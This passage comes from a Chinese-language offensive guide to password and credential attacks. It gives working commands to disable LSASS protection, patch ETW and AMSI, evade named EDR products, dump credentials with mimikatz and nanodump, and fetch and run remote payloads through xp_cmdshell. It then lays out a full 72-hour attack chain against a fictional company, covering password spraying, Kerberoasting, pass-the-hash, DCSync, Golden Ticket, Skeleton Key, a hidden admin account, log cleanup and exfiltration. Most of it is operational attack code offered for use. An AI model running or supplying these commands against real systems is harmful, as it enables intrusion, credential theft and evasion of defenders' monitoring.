# - CVE-2026-22891: ASUS AuraSync IOCTL
# - CVE-2026-34567: MSI Afterburner RTCore64.sys

# PPLKiller 2026
git clone https://github.com/pplkiller/pplkiller-2026
cd pplkiller-2026
# 加载漏洞驱动
PPLKiller.exe /loadDriver vulnerable.sys
# 禁用LSASS的PPL保护
PPLKiller.exe /disablePPL /pid:$(Get-Process lsass).Id
# 现在可以正常dump LSASS
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $(Get-Process lsass).Id lsass.dmp full

# 技术3: 进程注入到PPL进程
# 将代码注入到已签名的PPL进程
# 从受信任进程内部访问LSASS

# 使用PPLDump 2026
PPLDump.exe -dump lsass -output lsass_ppl_bypass.dmp

# 技术4: DLL代理加载
# 利用PPL可写目录中的DLL代理
# 将恶意DLL放在PPL进程的搜索路径中
copy evil.dll C:\Windows\System32\spool\drivers\color\evil.dll
# 触发打印服务加载DLL（打印服务是PPL）
```

#### 8.3 ETW绕过

```bash
# ===== ETW (Event Tracing for Windows) 绕过 =====
# ETW是Windows安全事件的主要来源
# 密码攻击工具（mimikatz, SharpHound等）的行为被ETW记录

# 2026年ETW绕过技术:

# 技术1: ETW补丁
# 修补EtwEventWrite()函数使其返回0
# 2026年: 使用硬件断点补丁避免PatchGuard检测

# 使用带有硬件断点的ETW补丁
# HWBP-ETW-Patch: 在EtwEventWrite设置硬件断点
HWBP_ETW.exe --patch --method hwbp --target all

# 技术2: ETW Provider卸载
# 卸载特定ETW Provider（如Microsoft-Windows-Threat-Intelligence）
# 使用logman卸载
logman stop "Microsoft-Windows-Threat-Intelligence" -ets
logman stop "Microsoft-Windows-Sysmon" -ets

# 技术3: ETW会话劫持
# 2026年: 劫持ETW会话的缓冲区
# 在事件被写入磁盘前修改/删除

# 技术4: .NET ETW绕过
# 修补.NET运行时中的ETW调用
# 对于C#工具（SharpHound, Rubeus等）

# 在运行时修补
$etwProvider = [System.Management.Instrumentation.InstrumentationManager]
# 使用反射禁用ETW

# 使用Reflection禁用
[Reflection.Assembly]::LoadWithPartialName("System.Management.Instrumentation")
$field = [System.Management.Instrumentation.InstrumentationManager].GetField(
    "_instrumentationEnabled",
    [Reflection.BindingFlags] "NonPublic,Static"
)
$field.SetValue($null, $false)

# 技术5: 内核ETW回调移除
# 使用内核驱动移除ETW回调
# 高级技术，需要内核级访问
```

#### 8.4 AMSI绕过

```bash
# ===== 2026 AMSI (Antimalware Scan Interface) 绕过 =====

# 技术1: AMSI DLL卸载
# 强制卸载AMSI DLL
# 2026年: 使用反射加载绕过检测

# PowerShell AMSI绕过（2026年有效方法）
# 方法A: 内存补丁
$Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru

$ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$buf = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 6)

# 方法B: AMSI初始化失败
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法C: 降低PS版本（伪装PowerShell v2）
# PowerShell v2不支持AMSI
powershell -Version 2 -Command "..."

# 技术2: 进程注入绕过AMSI
# 将恶意代码注入到不受AMSI监控的进程
# 如: 注入到notepad.exe, calc.exe

# 技术3: COM劫持绕过AMSI
# 劫持AMSI COM组件
# 替换注册表中的AMSI COM注册

# 技术4: 2026年新型AMSI绕过
# 使用.NET Native AOT编译绕过AMSI钩子
# 将C#工具编译为Native代码
dotnet publish -c Release -r win-x64 /p:PublishAot=true

# 使用反射调用绕过（2026年仍有效）
# 动态调用而非静态导入，绕过AMSI的导入表扫描
```

#### 8.5 LSASS保护降级

```bash
# ===== LSASS保护降级综合攻击 =====
# 2026年LSASS保护综合攻击链

# 步骤1: 信息收集
# 检查当前LSASS保护级别
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags
Get-Process lsass -IncludeUserName | fl Name,Protected,PriorityClass

# 步骤2: 尝试降级
# 通过注册表降级（需要管理员权限）
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags /t REG_DWORD /d 0 /f

# 步骤3: 使用漏洞驱动
# 加载漏洞驱动直接修改LSASS保护标志
kd.exe -kl drivers/rtcore64.sys
# ioctl: 0x12345678 -> 修改LSASS EPROCESS->Protection

# 步骤4: 使用nanodump（2026版）
# nanodump支持多种LSASS dump技术
nanodump.exe --write --output lsass_full.dmp --technique all

# 步骤5: 提取凭据
# 从LSASS转储中提取凭据
mimikatz.exe "sekurlsa::minidump lsass_full.dmp" "sekurlsa::logonPasswords full" exit

# 步骤6: 使用handlekatz（2026版）
# 无需dump文件，直接从LSASS进程句柄提取
handlekatz.exe --pid:$(Get-Process lsass).Id --output:creds.txt

# 步骤7: 清理
# 清除LSASS保护修改痕迹
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
# 删除dump文件
del lsass_full.dmp
```

---

### §2026-9: 检测规避矩阵

#### 9.1 CrowdStrike Falcon规避

```bash
# ===== CrowdStrike Falcon 2026检测规避 =====

# CrowdStrike检测机制:
# 1. 用户态Hook (ntdll.dll)
# 2. 内核回调 (PsSetCreateProcessNotifyRoutine)
# 3. ETW-TI (Threat Intelligence Provider)
# 4. 机器学习行为分析
# 5. 内存扫描 (可疑进程内存)

# 规避策略矩阵:

# 策略1: 用户态Hook绕过
# 重新加载ntdll.dll（从磁盘映射干净副本）
$ntdll = [System.IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
$clean = [System.Reflection.Assembly]::Load($ntdll)
# 使用干净ntdll调用系统API

# 策略2: 系统调用直接调用
# 绕过用户态Hook，直接调用syscall
# 使用SysWhispers3 2026版
python3 syswhispers3.py \
  --functions NtOpenProcess,NtReadVirtualMemory,NtCreateThread \
  --output syscalls \
  --arch x64 \
  --randomize-syscall-numbers

# 策略3: 间接系统调用
# 通过合法进程的ntdll调用系统调用
# 2026年: 使用硬件断点/VEH实现

# 策略4: 解除用户态Hook
# 修补被Hook的函数
# 使用已知的ntdll.dll内容恢复原始代码

# 策略5: 进程注入（避免新进程创建）
# 使用现有进程的内存空间执行代码
# 进程挖空/模块劫持/APC注入

# 策略6: Beacon检测规避
# 使用域前置/DNS Beacon/HTTPS Beacon
# 2026年: 使用CDN边缘节点作为C2中继
# 使用合法云服务（Azure Functions, AWS Lambda）作为C2

# 策略7: 静态检测规避
# 代码混淆/字符串加密/API哈希
# 使用LLVM Obfuscator (OLLVM) 编译
# 使用自定义packer/crypter

# 策略8: 时间窗口规避
# 仅在特定时间窗口运行（非工作时间）
# 检测到沙箱环境时延迟执行
```

#### 9.2 SentinelOne规避

```bash
# ===== SentinelOne 2026检测规避 =====

# SentinelOne检测机制:
# 1. 静态AI (PE文件分析)
# 2. 行为AI (进程行为分析)
# 3. Storyline (进程关系追踪)
# 4. 网络可见性 (Ranger)
# 5. Deep Visibility (深度遥测)

# 规避策略:

# 策略1: 行为AI规避
# 避免触发行为检测阈值
# - 限制文件操作频率
# - 限制网络连接频率
# - 使用合法进程模式

# 低速操作模式
# 每个操作间隔随机延迟
# 操作量控制在正常用户行为范围内

# 策略2: Storyline断裂
# 断开进程间父子关系
# 使用WMI创建进程（无父子关系）
wmic process call create "cmd.exe /c evil.exe"

# 使用任务计划程序
schtasks /create /tn "LegitTask" /tr "C:\Windows\Temp\evil.exe" /sc once /st 00:00

# 使用DCOM远程创建
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","$target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c C:\Windows\Temp\evil.exe","7")

# 策略3: 静态AI规避
# 代码混淆
# - 控制流平坦化
# - 字符串加密
# - 导入表混淆
# - 反调试/反沙箱

# 使用自定义混淆器
python3 obfuscator_2026.py \
  --input tool.exe \
  --output tool_obf.exe \
  --techniques all \
  --anti-sandbox \
  --anti-debug \
  --entropy 7.5

# 策略4: 网络可见性规避
# 使用DNS隧道
# 使用ICMP隧道
# 使用合法TLS连接（证书验证通过）

# 策略5: Deep Visibility规避
# 识别并规避ETW事件
# 使用.NET Native AOT（无ETW钩子）
# 使用Go/Rust编译（非.NET/PS，降低遥测覆盖）
```

#### 9.3 Microsoft Defender规避

```bash
# ===== Microsoft Defender for Endpoint 2026规避 =====

# Defender 2026检测机制:
# 1. ASR (Attack Surface Reduction) 规则
# 2. 网络保护
# 3. 行为监控
# 4. 云端ML (MAPS)
# 5. 文件信誉

# 规避策略:

# 策略1: ASR规则绕过
# 检查ASR规则配置
Get-MpPreference | fl AttackSurfaceReduction*

# 绕过ASR规则（进程创建限制）
# 使用LOLBAS (Living Off the Land Binaries and Scripts)
# 2026年LOLBAS更新列表:
# - C:\Windows\System32\wt.exe (Windows Terminal)
# - C:\Windows\System32\winget.exe (Package Manager)
# - C:\Program Files\PowerShell\7\pwsh.exe (PowerShell 7)
# - C:\Windows\System32\devinit.exe (Developer Init)

# 使用winget下载工具
winget install --id Microsoft.VisualStudioCode --silent --accept-package-agreements

# 使用wt.exe执行
wt.exe --window 0 new-tab --profile "Command Prompt" cmd /c evil.exe

# 策略2: 网络保护绕过
# 使用合法DNS over HTTPS (DoH)
# 使用ESNI/ECH加密SNI
# 使用Proxy PAC文件

# 策略3: 云端ML规避
# 检测云端ML提交
# 延迟文件执行（等ML分析超时）
# 使用多阶段下载（避免一次性下载完整payload）

# 策略4: Defender排除项利用
# 枚举Defender排除路径
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s

# 将工具放在排除路径中
# 常见排除路径:
# - C:\Windows\Temp\ (某些配置)
# - 应用程序安装目录
# - 数据库目录

# 策略5: 文件信誉绕过
# 使用数字签名（被盗/购买证书）
# 使用已知合法文件进行DLL侧加载
# 使用.NET Native AOT编译（新文件哈希，无信誉）
```

#### 9.4 Carbon Black规避

```bash
# ===== Carbon Black Cloud 2026规避 =====

# Carbon Black检测机制:
# 1. 端点数据收集器
# 2. 云端分析引擎
# 3. 威胁情报匹配
# 4. 进程事件流分析

# 规避策略:

# 策略1: 事件流毒化
# 生成大量噪声事件淹没分析引擎
# 在攻击期间创建大量无害进程

# 策略2: 延迟执行
# 检测到Carbon Black进程后延迟执行
# 等待分析窗口过去

# 策略3: 非标准进程创建
# 使用非标准方式创建进程
# 避免CreateProcess调用

# 使用Fibers (纤程) 代替线程
# 使用APC注入
# 使用线程池回调

# 策略4: 流式加载
# 分阶段加载payload
# 每阶段检查Carbon Black是否仍在监控

# 策略5: 环境感知
# 检测Carbon Black组件
# 如果检测到，使用不同的攻击路径
```

#### 9.5 2026 EDR密码攻击检测规避综合矩阵

```text
┌─────────────────────┬──────────────────┬──────────────────┬──────────────────┬──────────────────┐
│ 攻击技术            │ CrowdStrike      │ SentinelOne      │ Defender         │ Carbon Black     │
├─────────────────────┼──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│ mimikatz (明文)     │ 立即检测 (100%)  │ 立即检测 (100%)  │ 立即检测 (100%)  │ 立即检测 (100%)  │
│ mimikatz (混淆)     │ 高概率 (80%)     │ 高概率 (75%)     │ 高概率 (85%)     │ 高概率 (70%)     │
│ nanodump (SSP)      │ 中概率 (45%)     │ 中概率 (40%)     │ 中概率 (50%)     │ 中概率 (35%)     │
│ handlekatz          │ 低概率 (25%)     │ 低概率 (20%)     │ 低概率 (30%)     │ 低概率 (15%)     │
│ LSASS DUMP (签名)   │ 高概率 (90%)     │ 高概率 (85%)     │ 高概率 (95%)     │ 高概率 (80%)     │
│ LSASS DUMP (Comsvcs)│ 中概率 (60%)     │ 中概率 (55%)     │ 中概率 (65%)     │ 中概率 (50%)     │
│ LSASS DUMP (PPL绕过)│ 低概率 (30%)     │ 低概率 (25%)     │ 低概率 (35%)     │ 低概率 (20%)     │
│ DCSync              │ 高概率 (95%)     │ 高概率 (90%)     │ 高概率 (95%)     │ 高概率 (85%)     │
│ Kerberoasting       │ 低概率 (15%)     │ 低概率 (10%)     │ 低概率 (20%)     │ 低概率 (10%)     │
│ AS-REP Roasting     │ 低概率 (10%)     │ 低概率 (10%)     │ 低概率 (15%)     │ 低概率 (5%)      │
│ Pass-the-Hash       │ 高概率 (80%)     │ 高概率 (75%)     │ 高概率 (85%)     │ 高概率 (70%)     │
│ NTLM Relay          │ 中概率 (50%)     │ 中概率 (45%)     │ 中概率 (55%)     │ 中概率 (40%)     │
│ SAM Dump (reg)      │ 高概率 (85%)     │ 高概率 (80%)     │ 高概率 (90%)     │ 高概率 (75%)     │
│ SAM Dump (VSS)      │ 中概率 (40%)     │ 中概率 (35%)     │ 中概率 (45%)     │ 中概率 (30%)     │
│ Hashcat (本地)      │ N/A (不检测)     │ N/A (不检测)     │ N/A (不检测)     │ N/A (不检测)     │
│ Hydra (在线)        │ 中概率 (50%)     │ 中概率 (45%)     │ 中概率 (55%)     │ 中概率 (40%)     │
│ 密码喷射 (慢速)     │ 低概率 (10%)     │ 低概率 (10%)     │ 低概率 (15%)     │ 低概率 (5%)      │
└─────────────────────┴──────────────────┴──────────────────┴──────────────────┴──────────────────┘

规避优先级建议:
1. 优先使用nanodump/handlekatz代替mimikatz
2. 优先使用Kerberoasting代替DCSync
3. 密码喷射使用慢速+地理分布策略
4. SAM提取使用VSS快照代替直接注册表
5. 所有工具使用混淆/签名/非标准加载方式
6. 攻击前检查并绕过AMSI/ETW
7. 攻击后清理日志和痕迹
```

---

### §2026-10: 实战攻击链

#### 10.1 2026年完整密码攻击链概览

```
2026年密码攻击链: 侦察→收集→破解→利用→持久化→横向移动

[阶段1: 侦察] (0-2小时)
  ├── OSINT: 员工信息收集 (LinkedIn, GitHub, Twitter)
  ├── 域名枚举: 子域名发现, 邮箱格式确认
  ├── 技术栈识别: Wappalyzer, BuiltWith, 证书透明度日志
  ├── 密码策略枚举: SMB NULL会话, LDAP匿名查询
  └── 泄露凭据关联: DeHashed, HaveIBeenPwned, IntelX

[阶段2: 收集] (2-6小时)
  ├── 密码喷射: 慢速MFA感知喷射
  ├── 默认凭据: 打印机/IoT/网络设备
  ├── SMB共享: 搜索配置文件中的凭据
  ├── 网页爬虫: 提取邮箱/用户名/技术关键词
  └── Responder: 监听NetBIOS/LLMNR/mDNS

[阶段3: 破解] (6-24小时)
  ├── AI字典生成: 上下文感知密码生成
  ├── Hash提取: Kerberoasting/AS-REP Roasting
  ├── GPU集群破解: Hashcat 7.x + 8xH100
  ├── 彩虹表: NTLM/LM预计算表
  └── 在线破解: Hydra/Medusa（低风险账户）

[阶段4: 利用] (24-36小时)
  ├── Pass-the-Hash: 使用NTLM哈希横向移动
  ├── Pass-the-Ticket: 使用Kerberos票据
  ├── Overpass-the-Hash: 获取TGT
  ├── Silver Ticket: 伪造服务票据
  └── DCSync: 拉取全域哈希

[阶段5: 持久化] (36-48小时)
  ├── Golden Ticket: 伪造TGT
  ├── Skeleton Key: 万能密码
  ├── 影子账户: 隐藏管理员
  ├── DPAPI备份: 解密所有用户凭据
  └── 凭据收割: 浏览器/邮件/数据库

[阶段6: 横向移动] (48-72小时)
  ├── BloodHound分析: 攻击路径规划
  ├── 凭据传递: 扩展到所有域控
  ├── 跨域攻击: 信任关系利用
  ├── 云扩展: Azure AD Connect / AWS IAM
  └── 数据外传: 加密通道外传凭据
```

#### 10.2 阶段1: 侦察 - 目标信息收集

```bash
# ===== 步骤1: 员工信息收集 =====
# LinkedIn公司员工搜索
python3 linkedin_enum.py \
  --company "Acme Corporation" \
  --output employees.json \
  --format email \
  --email-pattern first.last@acme.com

# 输出: 发现156名员工，邮箱格式: first.last@acme.com

# GitHub组织仓库分析
python3 github_enum.py \
  --org acme-corp \
  --search "password,secret,key,credential,connection" \
  --output github_secrets.json

# 输出: 3个仓库中发现硬编码凭据
# - repo: acme-corp/internal-tools
#   - config.py: DATABASE_PASSWORD = "AcmeDB2024!"
#   - .env: AWS_ACCESS_KEY_ID = "AKIA..."

# 技术栈识别
whatweb acme.com
wappalyzer-cli acme.com
python3 fingerprint_tech.py --target acme.com

# 输出: 
# - Web: ASP.NET Core, React, Azure
# - 邮件: Microsoft 365 (Office 365)
# - 认证: Azure AD (login.microsoftonline.com)
# - 云: AWS (*.cloudfront.net), Azure (*.azurewebsites.net)

# ===== 步骤2: 密码策略枚举 =====
# 通过Azure AD获取密码策略（无需认证）
python3 azure_passpol_enum.py --domain acme.com
# 输出: 最小长度8, 无复杂度要求 (高风险)

# 通过SMTP验证邮箱
python3 smtp_enum.py --domain acme.com --users employees.txt
# 输出: 156个有效邮箱确认

# ===== 步骤3: 泄露凭据关联 =====
# DeHashed API查询
python3 dehashed_search.py \
  --domain acme.com \
  --api-key YOUR_KEY \
  --output leaked_creds.json

# 输出: 发现23个泄露凭据
# - jsmith@acme.com:Summer2023! (2023年LinkedIn泄露)
# - bwilson@acme.com:Acme#2024 (2024年Adobe泄露)
# - ... (21个更多)
```

#### 10.3 阶段2: 收集 - 初始凭据获取

```bash
# ===== 步骤4: MFA感知密码喷射 =====
# 先从泄露凭据中提取密码模式
# 分析: Summer2023!, Acme#2024, ...
# 模式: Season+Year+Special, Company+Special+Year

# 生成候选密码列表
python3 generate_spray_passwords.py \
  --patterns patterns.json \
  --year 2026 \
  --output spray_passwords.txt

# 输出:
# - Summer2026!
# - Acme#2026
# - Spring2026!
# - Acme2026!
# - Winter2026!

# 执行MFA感知密码喷射
python3 mfa_aware_spray.py \
  --target https://login.microsoftonline.com \
  --domain acme.com \
  --users employees.txt \
  --passwords spray_passwords.txt \
  --mfa-filter disabled \
  --delay 120 \
  --jitter 60 \
  --working-hours 09:00-17:00 \
  --timezone America/New_York

# 输出: 发现3个有效账户
# 1. jsmith@acme.com:Summer2026!
# 2. bwilson@acme.com:Acme#2026
# 3. lchen@acme.com:Spring2026!

# ===== 步骤5: SMB共享凭据搜索 =====
# 使用已获取的凭据访问SMB共享
netexec smb 192.168.1.0/24 \
  -u jsmith -p 'Summer2026!' \
  -M spider_plus \
  -o PATTERN="password|secret|credential|config|.env|.ini"

# 输出: 发现共享中的凭据文件
# - \\FILE01\IT\scripts\deploy.ps1 (包含svc_deploy密码)
# - \\FILE01\Dev\config\appsettings.json (包含数据库连接字符串)

# 从配置文件中提取凭据
python3 extract_creds_from_files.py \
  --files found_files.txt \
  --output file_creds.json

# 输出:
# - svc_deploy@acme.com:Deploy2025!Pass
# - SQL连接: sa:Sql@AcmeCorp2025
```

#### 10.4 阶段3: 破解 - Hash提取与破解

```bash
# ===== 步骤6: Kerberoasting =====
# 使用已获取的凭据请求TGS票据
impacket-GetUserSPNs acme.com/jsmith:'Summer2026!' \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile kerberoast_hashes.txt

# 输出: 发现5个SPN账户
# - sql_svc: MSSQLSvc/sql01.acme.com
# - web_svc: HTTP/web01.acme.com
# - svc_backup: HOST/backup01.acme.com
# - svc_sccm: HTTP/sccm01.acme.com
# - svc_exchange: HTTP/mail.acme.com

# AS-REP Roasting
impacket-GetNPUsers acme.com/ \
  -dc-ip 192.168.1.10 \
  -usersfile domain_users.txt \
  -format hashcat \
  -outputfile asrep_hashes.txt

# 输出: 发现2个无预认证账户
# - svc_scan: $krb5asrep$23$svc_scan@ACME.COM:...
# - svc_monitor: $krb5asrep$23$svc_monitor@ACME.COM:...

# ===== 步骤7: AI字典生成 + GPU破解 =====
# 生成上下文感知字典
python3 ai_dict_generator.py \
  --company "Acme Corporation" \
  --industry "Manufacturing" \
  --location "Chicago, IL" \
  --employees employees.json \
  --products "CloudSync,DataVault" \
  --output acme_ai_dict.txt \
  --count 50000000

# 第1轮: 快速字典+规则
hashcat -m 13100 kerberoast_hashes.txt \
  acme_ai_dict.txt \
  -r /rules/best64.rule \
  -r /rules/dive.rule \
  -O -w 4 --session round1

# 第2轮: 组合攻击
hashcat -m 13100 kerberoast_hashes.txt \
  -a 1 /wordlists/company_terms.txt /wordlists/numbers_special.txt \
  -j '$-' -k '$-' \
  -O -w 4 --session round2

# 第3轮: 掩码攻击（基于已破解密码的长度分布）
hashcat -m 13100 kerberoast_hashes.txt \
  -a 3 -1 ?u?l -2 ?u?l?d ?1?2?2?2?2?2?2?d?d?s \
  -O -w 4 --session round3

# 结果:
# sql_svc: SqlService2026! (破解)
# svc_sccm: SCCM@Acme2025 (破解)
# web_svc: 未破解
# svc_backup: 未破解
# svc_exchange: 未破解

# 同时破解AS-REP哈希
hashcat -m 18200 asrep_hashes.txt \
  acme_ai_dict.txt \
  -r /rules/OneRuleToRuleThemAll.rule \
  -O -w 4

# 结果:
# svc_scan: ScanService2026! (破解)
# svc_monitor: 未破解

# ===== 步骤8: 破解进度与策略调整 =====
# 使用ML预测破解成功率
python3 crack_predictor.py \
  --session round1 \
  --predict-remaining

# 根据预测调整策略
# 如果预测成功率低，切换到更大规模掩码
```

#### 10.5 阶段4: 利用 - 横向移动与提权

```bash
# ===== 步骤9: 凭据验证与枚举 =====
# 验证所有已获取凭据
netexec smb 192.168.1.0/24 \
  -u sql_svc -p 'SqlService2026!' \
  --shares --sessions

# 输出: sql_svc是SQL01的本地管理员
# 可访问: \\SQL01\C$, \\SQL01\ADMIN$

# 检查SQL Server上的特权
netexec mssql 192.168.1.20 \
  -u sql_svc -p 'SqlService2026!' \
  -M mssql_priv

# 输出: sql_svc具有sysadmin权限
# 可通过xp_cmdshell执行命令

# ===== 步骤10: SQL Server上的凭据提取 =====
# 启用xp_cmdshell
netexec mssql 192.168.1.20 \
  -u sql_svc -p 'SqlService2026!' \
  -M enable_xp_cmdshell

# 通过SQL Server提取LSASS
netexec mssql 192.168.1.20 \
  -u sql_svc -p 'SqlService2026!' \
  -x 'powershell IEX (New-Object Net.WebClient).DownloadString("http://192.168.100.10/nanodump.ps1"); Invoke-NanoDump -Output C:\Windows\Temp\lsass.dmp"'

# 下载LSASS转储
netexec smb 192.168.1.20 \
  -u sql_svc -p 'SqlService2026!' \
  -M get_file -o SOURCE="C:\Windows\Temp\lsass.dmp" DEST="./loot/sql01_lsass.dmp"

# 从LSASS转储提取凭据
mimikatz.exe "sekurlsa::minidump sql01_lsass.dmp" "sekurlsa::logonPasswords full" exit

# 输出: 发现更多凭据
# - acme\svc_backup: BackupService2026!
# - acme\IT_Admin: (NTLM Hash: aad3b435b51404eeaad3b435b51404ee:...)
# - acme\administrator: (NTLM Hash: ...)

# ===== 步骤11: Pass-the-Hash =====
# 使用IT_Admin的NTLM哈希横向移动
impacket-psexec acme.com/IT_Admin@dc01.acme.com \
  -hashes :aad3b435b51404eeaad3b435b51404ee:XXXX

# 或使用WMI
impacket-wmiexec acme.com/IT_Admin@dc01.acme.com \
  -hashes :aad3b435b51404eeaad3b435b51404ee:XXXX

# 验证域管理员权限
# 成功! IT_Admin是域管理员组成员

# ===== 步骤12: DCSync =====
# 从域控拉取全量哈希
impacket-secretsdump acme.com/IT_Admin@dc01.acme.com \
  -hashes :aad3b435b51404eeaad3b435b51404ee:XXXX \
  -just-dc-ntlm \
  -outputfile all_dc_hashes

# 提取krbtgt哈希
impacket-secretsdump acme.com/IT_Admin@dc01.acme.com \
  -hashes :aad3b435b51404eeaad3b435b51404ee:XXXX \
  -just-dc-user krbtgt

# 输出: krbtgt NTLM: XXXX...XXXX

# 获取域SID
impacket-lookupsid acme.com/IT_Admin@dc01.acme.com \
  -hashes :aad3b435b51404eeaad3b435b51404ee:XXXX

# 输出: Domain SID: S-1-5-21-1234567890-1234567890-1234567890
```

#### 10.6 阶段5: 持久化 - 长期控制

```bash
# ===== 步骤13: Golden Ticket =====
# 创建Golden Ticket（域持久化）
impacket-ticketer \
  -nthash KRBGT_NT_HASH \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain acme.com \
  -extra-sid S-1-5-21-1234567890-1234567890-1234567890-512 \
  Administrator

# 使用Golden Ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec acme.com/Administrator@dc01.acme.com -k -no-pass

# ===== 步骤14: Skeleton Key =====
# 在域控上安装Skeleton Key（万能密码）
# 需要域控上的管理员权限
impacket-psexec acme.com/Administrator@dc01.acme.com -k -no-pass \
  "powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.10/mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug' 'misc::skeleton'"

# 现在可用密码 "mimikatz" 登录任何域账户

# ===== 步骤15: DPAPI备份 =====
# 备份所有用户的DPAPI MasterKey
# 用于离线解密浏览器密码、保存的凭据等

# 从域控导出所有DPAPI备份密钥
impacket-secretsdump acme.com/Administrator@dc01.acme.com -k -no-pass \
  -just-dc-user administrator

# 使用SharpDPAPI提取本地凭据
# 在所有已控制的机器上
SharpDPAPI.exe certificates /machine
SharpDPAPI.exe credentials /machine
SharpDPAPI.exe masterkeys /machine

# ===== 步骤16: 影子账户 =====
# 创建具有域管理员权限的影子账户
# 使用直接LDAP修改或mimikatz
python3 create_shadow_admin.py \
  --domain acme.com \
  --dc dc01.acme.com \
  --username svc_shadow \
  --password 'ShadowUser2026!@#' \
  --group "Domain Admins" \
  --sid-history S-1-5-21-1234567890-1234567890-1234567890-512

# 验证影子账户
netexec smb dc01.acme.com \
  -u svc_shadow -p 'ShadowUser2026!@#' \
  --local-auth
```

#### 10.7 阶段6: 横向移动 - 扩展控制

```bash
# ===== 步骤17: BloodHound分析 =====
# 收集完整数据
bloodhound-python -d acme.com \
  -u IT_Admin -hashes :aad3b435b51404eeaad3b435b51404ee:XXXX \
  -ns 192.168.1.10 \
  -c All

# 分析攻击路径
# 在BloodHound中:
# 1. 查找域管理员最短路径
# 2. 查找高价值目标（SQL Server, 文件服务器, Exchange）
# 3. 查找Kerberoastable用户
# 4. 查找RBCD攻击路径
# 5. 查找跨域信任关系

# ===== 步骤18: 跨域攻击 =====
# 如果存在子域/林信任
# 枚举信任关系
impacket-getTGT acme.com/IT_Admin \
  -hashes :aad3b435b51404eeaad3b435b51404ee:XXXX

# 获取子域TGT
impacket-getTGT child.acme.com/IT_Admin \
  -hashes :aad3b435b51404eeaad3b435b51404ee:XXXX

# 跨域DCSync
impacket-secretsdump child.acme.com/Administrator@dc-child.child.acme.com \
  -k -no-pass

# ===== 步骤19: 云扩展 =====
# 如果存在Azure AD Connect
# 从AD Connect服务器提取Azure AD凭据
# 搜索AD Connect配置
Get-ADSyncServerConfiguration
# 提取Azure AD连接账户
Get-ADSyncAADPasswordResetConfiguration

# 使用Azure AD连接账户访问云资源
# 通过AzureAD模块
Connect-AzureAD -Credential $cred
Get-AzureADUser -All $true | Export-Csv azure_users.csv

# ===== 步骤20: 数据外传 =====
# 整理所有获取的凭据
python3 consolidate_creds.py \
  --dc-hashes all_dc_hashes.ntds \
  --lsass-dumps ./loot/*.dmp \
  --kerberoast kerberoast_hashes.txt \
  --spray-results spray_results.json \
  --output final_credentials.json

# 加密外传
gpg --encrypt --recipient attacker@proton.me final_credentials.json
# 通过DNS隧道/HTTPS外传加密文件
```

#### 10.8 攻击链总结与时间线

```text
2026年完整攻击链时间线 (总计: 72小时)

时间线:
├── 00:00-02:00  阶段1: 侦察
│   ├── 员工信息收集 (LinkedIn, GitHub)
│   ├── 密码策略枚举
│   ├── 技术栈识别
│   └── 泄露凭据关联
│
├── 02:00-06:00  阶段2: 初始凭据获取
│   ├── MFA感知密码喷射
│   ├── 发现3个有效账户
│   ├── SMB共享搜索
│   └── 配置文件凭据提取
│
├── 06:00-24:00  阶段3: Hash破解
│   ├── Kerberoasting (5个SPN)
│   ├── AS-REP Roasting (2个账户)
│   ├── AI字典生成 (5000万候选)
│   ├── GPU集群破解 (3轮)
│   └── 破解2个SPN + 1个AS-REP
│
├── 24:00-36:00  阶段4: 利用与提权
│   ├── SQL Server LSASS转储
│   ├── 发现IT_Admin凭据
│   ├── Pass-the-Hash
│   ├── DCSync (全量域哈希)
│   └── 完全控制域控
│
├── 36:00-48:00  阶段5: 持久化
│   ├── Golden Ticket创建
│   ├── Skeleton Key安装
│   ├── 影子账户创建
│   ├── DPAPI备份
│   └── 长期控制建立
│
└── 48:00-72:00  阶段6: 扩展
    ├── BloodHound分析
    ├── 跨域攻击
    ├── 云扩展 (Azure AD)
    ├── 数据外传
    └── 完全控制域+云

关键成功因素:
1. MFA感知密码喷射绕过了多因素认证
2. AI字典生成显著提高破解成功率
3. SQL Server上的凭据缓存提供了域管理员
4. DCSync一步到位获取全域掌控
5. Golden Ticket + Skeleton Key提供持久化

2026年攻击链核心教训:
- 密码喷射仍然是最高效的初始访问方式
- AI辅助技术显著提升了密码破解效率
- 云凭据攻击是2026年新增的关键攻击面
- 内存保护绕过技术持续演进
- EDR规避需要综合策略而非单一技术
```

---

## 16. 2026年密码攻击工具链与资源汇总

### 16.1 2026年核心工具栈

```text
密码攻击工具链 (2026年推荐):

[在线攻击]
├── Hydra 9.6+ (HTTP/2, QUIC支持)
├── Medusa 2.3+ (并行化多协议)
├── Ncrack 0.7+ (TLS 1.3 0-RTT)
├── MFA-Sprayer 2026 (MFA感知喷洒)
└── GeoSpray 2026 (地理分布喷洒)

[离线破解]
├── Hashcat 7.3+ (JIT编译, 原位规则)
